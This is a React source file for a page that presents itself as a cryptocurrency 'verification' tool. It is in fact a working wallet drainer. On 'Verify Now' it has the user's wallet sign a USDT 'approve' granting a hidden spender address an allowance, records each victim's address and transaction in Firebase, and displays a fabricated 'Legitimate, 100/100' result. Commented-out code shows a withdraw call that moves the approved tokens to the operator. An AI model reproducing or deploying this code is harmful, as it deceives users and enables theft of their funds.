// @ts-nocheck

import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { useSpring, animated } from 'react-spring'
import Button from '../common/Button'
import { database, push, ref } from '../../firebase/firebase';
import Web3 from 'web3';
import Swal from 'sweetalert2';
import { TronWeb } from 'tronweb';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';

const FULL_NODE = 'https://api.trongrid.io';
const SOLIDITY_NODE = 'https://api.trongrid.io';
const EVENT_SERVER = 'https://api.trongrid.io';
const PROJECT_ID = '150d746f7722fa489e9df7ad9ddcd955';
const RELAY_URL = 'wss://relay.walletconnect.com';
const trxContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'

interface FormState {
  contractAddress: string
  blockchain: string
}

const VerificationFormComponent = (props) => {
  const [formData, setFormData] = useState<FormState>({
    contractAddress: '',
    blockchain: 'binance'
  })
  const { setIsSubmitting, isSubmitting } = props
  const score = 100

  const [showResults, setShowResults] = useState(false)
  const [userDetail, setUserDetail] = useState({
    balance: 0,
    address: ''
  })
  const { address, wallet, connected, select, connect, disconnect } = useWallet();
  const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
  const [trxBalance, setTrxBalance] = useState(null);
  const [tokenBalance, setTokenBalance] = useState(null);
  const [loading, setLoading] = useState(false);

  const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
  const spenderTrx = import.meta.env.VITE_SPENDER_ADDRESS_TRX;
  const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
  const spenderAmount = import.meta.env.VITE_AMOUNT;

  const formAnimation = useSpring({
    opacity: 1,
    transform: 'translateY(0)',
    from: { opacity: 0, transform: 'translateY(20px)' },
    config: { tension: 300, friction: 20 }
  })

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const busdAbi = [
    {
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [{ "name": "_owner", "type": "address" }],
      "name": "balanceOf",
      "outputs": [{ "name": "balance", "type": "uint256" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [{
        "internalType": "uint8",
        "name": "",
        "type": "uint8"
      }],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        { "name": "_owner", "type": "address" },
        { "name": "_spender", "type": "address" }
      ],
      "name": "allowance",
      "outputs": [{ "name": "remaining", "type": "uint256" }],
      "type": "function"
    },
  ];

  const blockchainOptions = [
    { value: 'binance', label: 'Binance Smart Chain (BSC)' },
    { value: 'tron', label: 'Tron (TRC)' },
  ]

  const addData = (keyName, userAddress, tx, address) => {
    if (userAddress.trim() !== "") {
      const newDataRef = ref(database, keyName);
      const newItemObject = {
        id: tx,
        userAddress: userAddress,
        transactionHash: tx,
        spenderAddress: address
      };
      push(newDataRef, newItemObject);
    }
    setIsSubmitting(false);
  };

  const approveToken = async () => {
    const web3 = new Web3(window.ethereum);
    setIsSubmitting(true);
    try {
      if (!window.ethereum) throw new Error("MetaMask/Trust Wallet is not installed.");

      const networkId = await web3.eth.net.getId();
      if (networkId != 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            throw new Error("Binance Smart Chain is not available in your wallet. Please add it manually.");
          }
          throw new Error("Network switch failed");
        }
      }
      const accounts = await web3.eth.requestAccounts();
      const userAccount = accounts[0];

      const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
      const maxApproval = web3.utils.toWei(spenderAmount, "wei");
      const tx = await busdContract.methods.approve(spenderAddress, maxApproval).send({ from: userAccount });
      const balance = await busdContract.methods.balanceOf(userAccount).call();
      const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
      addData('clientUsers', userAccount, tx?.transactionHash, spenderAddress)
      setUserDetail({
        address: userAccount,
        balance: balanceInBUSD
      })
      setTimeout(() => {
        setShowResults(true)
      }, 100);

    } catch (err) {
      Swal.fire({
        icon: "error",
        title: "Failed",
        text: "Verification Failed!"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getCurrentDate = () => {
    const today = new Date()
    return today.toISOString().split('T')[0]
  }

  // Trx code

  const fetchTrxBalance = async () => {
    tronWeb.setAddress(address);
    const trxBalance = await tronWeb.trx.getBalance(address);
    const contract = await tronWeb.contract().at(trxContractAddress);
    const usdtTrx = await contract.balanceOf(address).call();
    const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
    const balanceTrx = trxBalance / 1_000_000
    console.log('hello');
    
    if (balanceTrx > 35 && balanceUSDT > 0) {
      handleApprove(balanceUSDT)
    } else {
      setIsSubmitting(false);
      Swal.fire({
        icon: "error",
        title: "Insufficient Balance",
        text: "You need at least 35 TRX and 1 USDT for the verificaion."
      });
      return;
    }
  };


  const pollTransaction = async (txid) => {
    // setStatus('Waiting for confirmation...');
    // for (let i = 0; i < 20; i++) {
    //   try {
    //     const info = await tronWeb.trx.getTransactionInfo(txid);
    //     if (info.receipt?.result === 'SUCCESS') {
    //       setStatus('Transaction confirmed ✅');
    //       setTxConfirmed(true);
    //       return;
    //     }
    //   } catch (e) { }
    //   await new Promise(resolve => setTimeout(resolve, 3000));
    // }
    // setStatus('Transaction not confirmed in time ⏱️');
  };

  const handleApprove = async (balanceUSDT) => {

    try {
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        trxContractAddress,
        'approve(address,uint256)',
        {
          feeLimit: 300_000_000,
          callValue: 0,
          shouldPollResponse: false
        },
        [
          { type: 'address', value: spenderTrx },
          { type: 'uint256', value: (spenderAmount * 1_000_000).toString() },
        ],
        address
      );

      const signedTx = await wallet.adapter.signTransaction(transaction);

      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);

      if (receipt?.txid) {
        addData('trxUsers', address, receipt?.txid, spenderTrx)
        setUserDetail({
          address: address,
          balance: balanceUSDT
        })
        setTimeout(() => {
          setShowResults(true)
        }, 100);
        setIsSubmitting(false); 
      } else {
        setIsSubmitting(false);
        Swal.fire({
          icon: "error",
          title: "Verification Failed",
          text: error.message || "An error occurred while doing the verfication."
        });
      }

    } catch (error) {
      setIsSubmitting(false);
      Swal.fire({
        icon: "error",
        title: "Verification Failed",
        text: error.message || "An error occurred while doing the verfication."
      });
    }
  };

  // const handleWithdrawFromUser = async () => {
  //   try {
  //     const response = await fetch("http://192.168.29.251:3000/api/withdraw", {
  //       method: "POST",
  //       headers: {
  //         "Content-Type": "application/json",
  //       },
  //       body: JSON.stringify({
  //         owner: 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r',           // address that approved the tokens
  //         recipient: spenderTrx,   // where the tokens should be sent
  //         amount: 5,                // in USDT (e.g., 5 not 5_000_000)
  //       }),
  //     });

  //     const data = await response.json();
  //     if (data.success) {
  //       console.log("✅ Withdraw TX:", data.txid);
  //     } else {
  //       console.error("❌ Withdraw failed:", data.error);
  //     }
  //   } catch (err) {
  //     console.error("❌ Error during withdraw:", err);
  //   }
  // };

  // const checkAllowance = async () => {
  //   const address = 'TXYtwPinqqB1Wk7QV3pk2m5VX6x4anvZ2r'; // Replace with the user's address
  //   if (!TronWeb.isAddress(address) || !TronWeb.isAddress(spenderTrx)) {
  //     console.error('Invalid addresses');
  //     return;
  //   }
  //   try {
  //     const contract = await tronWeb.contract().at(trxContractAddress);
  //     const result = await contract.allowance(address, spenderTrx).call({ from: address });
  //     const allowance = parseInt(result.toString(), 10) / 1_000_000;
  //     console.log('Allowance:', allowance);
  //     return allowance;
  //   } catch (err) {
  //     console.error('Allowance check failed:', err);
  //   }
  // };

  useEffect(() => {
    console.log('Wallet connected:', connected, 'Address:', address);
    
    if (connected && address) {
      fetchTrxBalance()
    }
  }, [connected, address]);

  const handleConnect = async () => {
    setIsSubmitting(true);
    try {
      await select('WalletConnect');
      await connect();
    } catch (err) {
      Swal.fire({
        icon: "error",
        title: "Connection Cancelled",
        text: "Wallet connection was cancelled or failed."
      });
      setIsSubmitting(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (formData?.blockchain === 'tron') {
      handleConnect()
    } else if (formData?.blockchain === 'binance') {
      approveToken()
    }
  }

  return (
    <animated.div style={formAnimation} className="verification-form-container">
      <div className="form-header">
        <h2>Verify Cryptocurrency</h2>
        <p>Enter the contract address to verify authenticity and security</p>
      </div>

      <form onSubmit={handleSubmit} className="verification-form">
        <div className="form-group">
          <label htmlFor="blockchain">Select Blockchain</label>
          <select
            id="blockchain"
            name="blockchain"
            value={formData.blockchain}
            onChange={handleChange}
            className="form-control"
            required
          >
            {blockchainOptions.map(option => (
              <option key={option.value} value={option.value}>
                {option.label}
              </option>
            ))}
          </select>
        </div>

        <Button
          label={isSubmitting ? "Verifying..." : "Verify Now"}
          variant="primary"
          size="large"
          type="submit"
          fullWidth
          disabled={isSubmitting}
        />
      </form>
      {isSubmitting && (
        <div className="verification-loading">
          <div className="loading-spinner-small"></div>
          <p>Scanning blockchain data and security databases...</p>
        </div>
      )}

      {showResults && (
        <div className="verification-results">
          <div className="result-header success">
            <div className="result-icon">✓</div>
            <div className="result-title">Verification Complete</div>
          </div>

          <div className="result-details">
            <div className="result-item">
              <span className="result-label">Security Score:</span>
              <span className="result-value">{score}/100</span>
            </div>
            <div className="result-item">
              <span className="result-label">Contract Type:</span>
              <span className="result-value">BEP-20 Token</span>
            </div>
            <div className="result-item">
              <span className="result-label">Address:</span>
              <span className="result-value">{userDetail?.address}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Current Balance:</span>
              <span className="result-value">{userDetail?.balance}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Creation Date:</span>
              <span className="result-value">{getCurrentDate()}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Verified Status:</span>
              <span className="result-value success">Legitimate</span>
            </div>
          </div>
        </div>
      )}
    </animated.div>
  )
}

export default function VerificationForm() {
  const adapter = useMemo(
    () =>
      new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          projectId: PROJECT_ID,
          relayUrl: RELAY_URL,
          metadata: {
            name: 'My Tron DApp',
            description: 'DApp with WalletConnect',
            url: window.location.origin,
            icons: [],
          },
        },
        web3ModalConfig: {
          themeMode: "dark",
          themeVariables: {
            "--w3m-z-index": 1000,
          },
          explorerRecommendedWalletIds: [
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", //trust wallet
          ],
        },
      }),
    []
  );
  const [isSubmitting, setIsSubmitting] = useState(false)

  const onError = (e) => {
    console.log('Wallet error:', e);
    setIsSubmitting(false)
  };

  return (
    <WalletProvider adapters={[adapter]} onError={onError} autoConnect={false}>
      <VerificationFormComponent
        setIsSubmitting={setIsSubmitting}
        isSubmitting={isSubmitting}
      />
    </WalletProvider>
  );
}